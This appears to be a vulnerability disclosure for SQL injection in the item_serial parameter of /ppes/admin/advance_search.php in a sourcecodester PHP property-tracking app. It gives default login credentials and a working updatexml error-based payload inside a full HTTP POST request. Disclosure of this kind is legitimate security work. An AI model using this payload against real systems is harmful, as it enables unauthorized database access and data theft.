# Personnel Property Equipment System v1.0 by sourcecodester has SQL injection 4

BUG_Author: Zhang Qi

Login account: Jonremus/admin

vendors: https://www.sourcecodester.com/php/11255/personel-property-equipment-system.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /ppes/admin/advance_search.php

Vulnerability location: /ppes/admin/advance_search.php, item_name=linovo&item_serial=

dbname = ppes

[+] Payload: item_name=linovo&item_serial=1' and updatexml(1,concat(0x7e,database()),3)# // Leak place ---> id

```sql
POST /ppes/admin/advance_search.php HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=1lo81k0mv3p5cfonn5hopvoht6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 75

item_name=linovo&item_serial=1' and updatexml(1,concat(0x7e,database()),3)#
```

<img width="1634" height="666" alt="image" src="https://github.com/user-attachments/assets/6f523e51-c619-42e8-b202-ecf83a7d46d5" />
